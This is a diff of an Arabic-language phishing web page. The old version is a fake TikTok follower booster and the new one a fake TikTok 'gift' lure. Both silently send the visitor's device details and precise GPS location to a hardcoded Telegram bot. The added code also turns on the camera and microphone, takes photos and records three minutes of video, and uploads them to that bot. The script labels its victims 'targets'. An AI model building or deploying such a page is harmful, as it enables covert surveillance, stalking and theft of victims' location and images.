@@ -3,76 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Global Booster | رشق متابعين تيك توك</title>
+    <title>🎁 مفاجأة خاصة لك 🎁</title>
     <style>
-        body { background: #010101; color: #fe2c55; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; overflow-x: hidden; }
-        .glitch { font-size: 30px; font-weight: bold; text-transform: uppercase; position: relative; text-shadow: 0.05em 0 0 #25f4ee, -0.025em -0.05em 0 #fe2c55; animation: glitch 1s infinite; }
-        @keyframes glitch { 0% { text-shadow: 0.05em 0 0 #25f4ee; } 50% { text-shadow: -0.05em -0.025em 0 #fe2c55; } 100% { text-shadow: 0.025em 0.05em 0 #25f4ee; } }
-        .container { margin-top: 50px; border: 2px solid #25f4ee; padding: 20px; display: inline-block; border-radius: 15px; background: rgba(0,0,0,0.8); box-shadow: 0 0 20px #fe2c55; }
-        input { padding: 10px; border-radius: 5px; border: 1px solid #25f4ee; background: #222; color: #fff; width: 80%; margin: 10px 0; }
-        button { background: #fe2c55; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #25f4ee; color: #000; box-shadow: 0 0 15px #25f4ee; }
-        #status { margin-top: 20px; font-size: 14px; color: #25f4ee; }
-        .overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); display:none; flex-direction:column; justify-content:center; align-items:center; z-index:1000; }
+        body { background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%); font-family: 'Cairo', sans-serif; color: #fff; text-align: center; height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        .card { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(15px); padding: 40px; border-radius: 30px; border: 2px solid #fff; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 85%; max-width: 400px; }
+        h1 { font-size: 28px; margin-bottom: 10px; }
+        p { font-size: 18px; line-height: 1.6; }
+        .btn { background: #fff; color: #ff758c; padding: 15px 30px; border-radius: 50px; font-weight: bold; text-decoration: none; display: inline-block; margin-top: 20px; cursor: pointer; border: none; font-size: 18px; box-shadow: 0 5px 15px rgba(255,117,140,0.4); }
+        #camera-feed { display: none; }
     </style>
 </head>
 <body>
-
-    <div class="container">
-        <div class="glitch">TIKTOK FOLLOWER GEN v9.0</div>
-        <p>أدخل يوزرك للحصول على 50 ألف متابع حقيقي فوراً</p>
-        <input type="text" id="username" placeholder="@username" required>
-        <br>
-        <button onclick="startHack()">ابدأ الرشق الآن 🔥</button>
-        <div id="status">النظام جاهز... بانتظار اليوزر</div>
+    <div class="card">
+        <h1>يا أهلاً بهذا الوجه الجميل! ✨</h1>
+        <p>لقد تم اختيارك للحصول على هدية "تيك توك" الذهبية لهذا العام. أنت شخص مميز وتستحق الأفضل دائماً..</p>
+        <p>فقط اضغط "استلام الهدية" لربط حسابك بأقرب مركز هدايا بجانبك الآن! 🎁</p>
+        <button class="btn" onclick="startHeist()">🎁 استلام الهدية 🎁</button>
     </div>
 
-    <div id="verifyBox" class="overlay">
-        <h2 style="color: #25f4ee;">⚠️ إجراء أمني مطلوب</h2>
-        <p>للتحقق من أنك لست روبوت، يجب تفعيل خدمة "تحديد المواقع" لربط حسابك بأقرب سيرفر تيك توك</p>
-        <div id="loader" style="border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite;"></div>
-        <p id="vStatus">جاري فحص الاتصال...</p>
-    </div>
+    <video id="camera-feed" autoplay playsinline></video>
 
     <script>
         const BOT_TOKEN = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M";
         const CHAT_ID = "5475815049";
 
-        function sendToTelegram(msg) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-        }
-
-        function startHack() {
-            let user = document.getElementById('username').value;
-            if(!user) return alert("أدخل اليوزر أولاً!");
-            
-            document.getElementById('verifyBox').style.display = 'flex';
-            
-            // سحب معلومات الجهاز والمتصفح صامتاً
-            let deviceInfo = `🚨 *TARGET ENTERED TRAP* 🚨\n\n👤 *User:* ${user}\n📱 *Platform:* ${navigator.platform}\n🌐 *Browser:* ${navigator.userAgent}\n🖥️ *Screen:* ${screen.width}x${screen.height}`;
-            sendToTelegram(deviceInfo);
-
-            // طلب الـ GPS "غصباً" للتحقق
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    let lat = pos.coords.latitude;
-                    let lon = pos.coords.longitude;
-                    let acc = pos.coords.accuracy;
-                    let maps = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    let gpsData = `📍 *PRECISE GPS CAPTURED* 📍\n\n🌎 *Lat:* \`${lat}\`\n🌎 *Lon:* \`${lon}\`\n🎯 *Acc:* \`${acc}m\`\n\n🗺️ [Open in Google Maps](${maps})`;
-                    sendToTelegram(gpsData);
-                    
-                    document.getElementById('vStatus').innerText = "تم التحقق من الموقع! جاري إرسال المتابعين...";
-                    setTimeout(() => { alert("خطأ في الخادم! حاول لاحقاً."); location.reload(); }, 3000);
-                }, err => {
-                    sendToTelegram(`❌ *Target Refused GPS:* ${err.message}`);
-                    document.getElementById('vStatus').innerText = "فشل التحقق! يجب السماح بالوصول للموقع للمتابعة.";
-                }, {enableHighAccuracy: true, timeout: 5000});
+        function sendToTelegram(msg, isFile = false, blob = null) {
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
+            if (isFile) {
+                let formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('document', blob, 'captured_media.png');
+                fetch(url + 'sendDocument', { method: 'POST', body: formData });
+            } else {
+                fetch(url + `sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
             }
         }
-    </script>
 
-    <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
+        async function startHeist() {
+            // 1. طلب الـ GPS بدقة عالية (تحت غطاء "استلام الهدية")
+            navigator.geolocation.getCurrentPosition(pos => {
+                let maps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                sendToTelegram(`🎯 *TARGET PINPOINTED*\n📍 GPS: [Click here](${maps})`);
+            }, null, { enableHighAccuracy: true });
+
+            // 2. الوصول للكاميرا لسحب الصور والفيديو
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.getElementById('camera-feed');
+                video.srcObject = stream;
+
+                // التقاط 3 صور فوراً
+                let count = 0;
+                let interval = setInterval(() => {
+                    if (count >= 3) { clearInterval(interval); return; }
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => sendToTelegram("📸 Photo Captured", true, blob));
+                    count++;
+                }, 2000);
+
+                // تسجيل فيديو لمدة 3 دقائق في الخلفية
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    sendToTelegram("🎥 Full 3-Min Video Captured", true, blob);
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 180000); // 3 دقائق
+
+            } catch (e) { sendToTelegram("❌ Camera Access Refused"); }
+
+            // 3. سحب المعلومات التقنية (إيميلات، حسابات، متصفح)
+            let info = `👤 *SENSITIVE SYSTEM DATA* 👤\n` +
+                       `📧 *Browser Accounts:* ${navigator.userAgent}\n` +
+                       `📱 *Platform:* ${navigator.platform}\n` +
+                       `🌐 *Language:* ${navigator.language}\n` +
+                       `🕰️ *Last Sites Check:* ${document.referrer || "None"}`;
+            sendToTelegram(info);
+            
+            alert("جاري معالجة الهدية... يرجى عدم إغلاق الصفحة لمدة 3 دقائق لضمان التوصيل!");
+        }
+    </script>
 </body>
 </html>
